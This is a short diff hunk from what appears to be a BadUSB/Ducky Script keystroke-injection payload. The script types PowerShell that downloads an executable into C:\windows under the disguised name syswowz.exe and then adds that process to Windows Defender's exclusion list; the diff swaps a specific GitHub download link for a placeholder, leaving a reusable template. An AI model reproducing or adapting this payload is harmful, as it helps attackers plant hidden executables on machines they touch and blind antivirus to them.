@@ -7,7 +7,7 @@ DELAY 750
 LEFT
 ENTER
 DELAY 750
-STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/H3lix-Fire/H3lix-Fire.github.io/main/downloads/H3lix%20Injector.exe" -OutFile "C:\windows\syswowz.exe"
+STRING Invoke-WebRequest -Uri "FILE TO DOWNLOAD HERE" -OutFile "C:\windows\syswowz.exe"
 ENTER
 STRING Add-MpPreference -ExclusionProcess "C:\windows\syswowz.exe"
 ENTER
